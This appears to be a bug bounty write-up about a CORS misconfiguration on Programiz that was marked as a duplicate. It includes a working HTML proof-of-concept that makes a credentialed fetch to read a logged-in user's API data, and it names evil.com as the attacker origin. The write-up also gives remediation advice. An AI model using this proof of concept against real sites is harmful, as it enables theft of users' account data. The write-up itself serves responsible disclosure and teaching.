# 🛡️ CORS Misconfiguration – Programiz (Duplicate Report)

---

## 👋 Hello Hackers!!!

This was one of my first bug bounty reports — a **CORS misconfiguration** I found on [Programiz](https://www.programiz.com). The bug was eventually marked as a **duplicate**, but I still learned a ton, and wanted to document the process here.

---

## 🐞 The Vulnerability

So here’s what happened:

The API was responding with:
- `Access-Control-Allow-Origin: https://evil.com`
- `Access-Control-Allow-Credentials: true`


That combo is **straight-up dangerous**. It basically allows any attacker-controlled domain (like `evil.com`) to interact with the authenticated API **using the victim's cookies**.

---

## ⚠️ What It Could Do

If a user is logged into Programiz and visits a malicious site, that site could:

- Send requests to the Programiz API
- Steal sensitive user data
- Possibly escalate if chained with other issues

---

## 🔬 PoC I Used

I wrote a basic HTML PoC to test this vulnerability. Here's the snippet:

```html
<!DOCTYPE html>
<html>
<head><title>Improper CORS Test</title></head>
<body>
  <h2>Improper CORS Vulnerability Test</h2>
  <button id="testBtn">Test Fetch with Credentials</button>
  <pre id="result" style="white-space: pre-wrap; background: #eee; padding: 10px; margin-top: 10px;"></pre>

  <script>
    document.getElementById('testBtn').onclick = function () {
      fetch('https://<vuln-pointd>', {
        method: 'GET',
        credentials: 'include'
      })
      .then(response => {
        if (!response.ok) throw new Error('HTTP error ' + response.status);
        return response.json();
      })
      .then(data => {
        document.getElementById('result').textContent = JSON.stringify(data, null, 2);
      })
      .catch(error => {
        document.getElementById('result').textContent = 'Error: ' + error.message;
      });
    };
  </script>
</body>
</html>
```
## 🌐 CORS Misconfiguration Response
![6ce75f41-e6b2-4330-ab5b-8f53a5106acf](https://github.com/user-attachments/assets/655f67eb-34f7-441d-8e39-5c32a527fe2d)

## ✅ Successful Data Leak
![f5be6e5e-2fcf-4128-a6c5-af44f9e95a0d](https://github.com/user-attachments/assets/d2a37d67-e196-4e6c-b742-93e575ca17dc)

## 🛠️ Recommended Fix
- Never `allow Access-Control-Allow-Origin` to accept untrusted origins.
- Don't set `Access-Control-Allow-Credentials: true` unless it’s truly required.
- Use a strict allowlist of trusted domains.

## 🧠 What I Learned
Even though it was a duplicate, I:

- Understood real-world CORS misconfig better
- Practiced building a clean PoC
- Got familiar with proper reporting

You don’t need every bug to be accepted — **learning from them is still a win**.

**Signing off ✌️**

**[ROHAN S](https://www.linkedin.com/in/rohanscr7123/)** 

(**Aspiring Security Engineer**)
